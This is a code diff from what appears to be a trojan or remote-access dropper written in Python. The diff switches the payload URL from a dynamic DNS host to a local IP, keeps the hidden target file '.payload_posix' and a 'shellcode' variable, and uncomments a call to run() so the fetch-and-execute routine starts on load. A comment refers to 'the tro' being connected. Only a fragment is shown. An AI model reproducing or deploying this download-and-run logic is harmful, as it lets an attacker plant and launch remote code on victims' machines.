@@ -24,7 +24,7 @@ except:
 #TODO: use free FTP server
 bin = False
 ScriptExec = "python3.5 " # "./"  #cmd= "./{}".format(OsTargetpath)
-url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
+url = "http://192.168.2.112:8000/TCP_client.py"
 OsTargetpath = ".payload_posix"
 shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
@@ -79,7 +79,7 @@ def run(**args):
     return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-#run()
+run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
